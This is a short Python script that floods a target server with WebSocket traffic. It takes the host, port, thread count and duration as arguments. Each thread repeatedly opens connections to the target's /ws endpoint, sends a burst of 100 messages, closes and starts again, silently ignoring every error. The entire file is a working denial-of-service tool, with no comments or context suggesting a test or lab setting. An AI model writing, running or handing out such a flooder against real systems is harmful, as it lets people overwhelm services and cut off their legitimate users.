#!/usr/bin/env python3
import sys, time, threading, random
try:
    import websocket
    HAS_WS = True
except ImportError:
    HAS_WS = False

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])

if not HAS_WS:
    print("WebSocket requires websocket-client: pip install websocket-client")
    sys.exit(1)

def websocket_flood():
    while running:
        try:
            ws = websocket.WebSocket()
            ws.connect(f"ws://{target}:{port}/ws")
            for i in range(100):
                ws.send(f"ping_{i}")
            ws.close()
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=websocket_flood).start()

if duration > 0:
    time.sleep(duration)
    running = False
else:
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
